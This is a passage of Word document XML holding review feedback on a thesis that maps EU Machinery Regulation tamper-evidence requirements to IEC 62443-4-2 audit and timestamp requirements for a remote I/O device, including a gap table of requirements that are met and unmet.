      <w:hyperlink r:id="rId46" w:history="1">
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00690A16">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId47" w:history="1">
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1B512BD7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lastRenderedPageBreak/>
        <w:t xml:space="preserve">The corrected verdict is cleaner: </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-002 protects against accidental corruption (CRC/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_ParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> + seals + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>init</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-only read) but not intentional corruption (no MAC/signature, resistance-only physical barrier)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — with the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> dimension now living entirely in RQ-003.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="140B991F" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00E404B9" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Would you like me to (a) also re-check </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-004/005</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for the same evidence-scope boundary (they reference audit in places), (b) complete </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ002-02/04</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, or (c) proceed to consolidation of the corrected set?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3210C77D" w14:textId="77777777" w:rsidR="003670E7" w:rsidRDefault="003670E7" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CC29717" w14:textId="77777777" w:rsidR="003670E7" w:rsidRDefault="003670E7" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DFD7570" w14:textId="77777777" w:rsidR="00716E6F" w:rsidRDefault="00716E6F" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="133C2B6A" w14:textId="77777777" w:rsidR="00B940EB" w:rsidRDefault="00B940EB" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5010DDCD" w14:textId="77777777" w:rsidR="00B940EB" w:rsidRDefault="00B940EB" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="263B8F83" w14:textId="77777777" w:rsidR="00B940EB" w:rsidRDefault="00B940EB" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27577E79" w14:textId="77777777" w:rsidR="00716E6F" w:rsidRDefault="00716E6F" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A0DBBD0" w14:textId="77777777" w:rsidR="00716E6F" w:rsidRDefault="00716E6F" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C75EA36" w14:textId="77777777" w:rsidR="00716E6F" w:rsidRDefault="00716E6F" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="730B8F6A" w14:textId="77777777" w:rsidR="00716E6F" w:rsidRDefault="00716E6F" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BB8DA36" w14:textId="77777777" w:rsidR="00716E6F" w:rsidRDefault="00716E6F" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="218F25ED" w14:textId="77777777" w:rsidR="00716E6F" w:rsidRDefault="00716E6F" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51968552" w14:textId="642FF550" w:rsidR="00716E6F" w:rsidRPr="00C1714F" w:rsidRDefault="00716E6F" w:rsidP="00716E6F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t xml:space="preserve">REQUIREMENT </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A379687" w14:textId="77777777" w:rsidR="00716E6F" w:rsidRDefault="00716E6F" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28EB345E" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 1 — Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6244CA65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RQ-003 is the </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>accountability twin</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of RQ-002: where RQ-002 required </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>protection</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> against corruption, RQ-003 requires </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>evidence collection</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of intervention. This is precisely the "collect evidence of intervention" clause I flagged as missing in your RQ-002 mapping — so it is good to see it broken out as its own requirement. Your analysis is </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>honest and directionally correct</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and your central conclusion (the requirement is essentially </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not met</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for physical interventions) is defensible. However, the CR set is </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>materially incomplete</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and you have </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">overlooked several partial evidence mechanisms that the device </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>does</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> implement</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — a rigorous thesis must acknowledge and then dismantle them, rather than claim nothing exists.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04157324" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.1 Requirement &amp; CR Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45EED583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Your text is EU Machinery Regulation (EU) 2023/1230, Annex III </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EHSR 1.1.9 §2</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (the evidence sentence). This is fundamentally an </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>audit/accountability</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement, and audit requirements in IEC 62443-4-2 never </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>stand alone</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — CR 2.8 is the </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>generation</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of records, but a record without </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>time, capacity, overflow handling, and protection</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is not usable evidence.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904"/>
        <w:gridCol w:w="1799"/>
        <w:gridCol w:w="4599"/>
      </w:tblGrid>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="10F377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81ED96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CR / EDR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847C04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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your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968E48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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74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DD1820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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Correction</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> / Addition</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="3C46E2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67983" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve">CR 2.8 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>Auditable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events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0723B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AFA88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Correct, but </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>unmet for physical interventions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9F69D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Keep. The device generates </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ErrorEvents</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> for </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>logical/self-detected</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> faults, not for physical switch/seal manipulation.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="21D1D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08B5D" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>CR 2.12 – Non-repudiation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F1899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F66B2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Correct target, but </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>structurally impossible</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> here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38E95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Keep with caveat: CR 2.12 base is about </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>human users</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> determined via identity. The physical F-address interface has </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no user authentication</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, so attribution ("who </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>intervened") cannot be satisfied by design.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="4323E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BB5E0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lastRenderedPageBreak/>
              <w:t xml:space="preserve">EDR 3.11 – Physical tamper resistance </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>and detection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D09F9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466C1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Correct — the </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>detection</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> limb is the relevant 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6D707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Keep. Seals = resistance; detection limb is unmet (→ gap).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="6CBAC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F10F8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 xml:space="preserve">CR 2.11 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Timestamps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AD7AE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❌</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74"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10307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rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Add — this is the decisive omission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E150F" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Evidence without reliable time is not evidence. The device has </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">only a 4-byte uptime counter in seconds that is </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>cleared/reset on cold start</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (SRIO-15218/15398) and a </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>systick</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> in </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ms</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no absolute/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>synchronised</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> real-time clock</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve">An </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>intervention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therefore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cannot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be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placed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> in absolute time.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="3C467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D6E23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 xml:space="preserve">CR 2.9 – Audit </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>storage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capacity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9728A1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❌</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74"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E8241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➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>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7C251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The COM Error Log is a </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>circular buffer of ≥100 entries</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (SRIO-10703/10663) — old evidence is overwritten.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="7685F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71709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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>CR 2.10 – Response to audit processing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BA9E9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❌</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74"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20A04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➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>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70209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No defined safe </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>behaviour</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> on log overflow beyond circular overwrite.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="7C18E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155DD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 xml:space="preserve">CR 3.9 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Protection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of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audit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information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7B9F3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❌</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74"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5A819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➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>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E94A1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The evidence store is </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
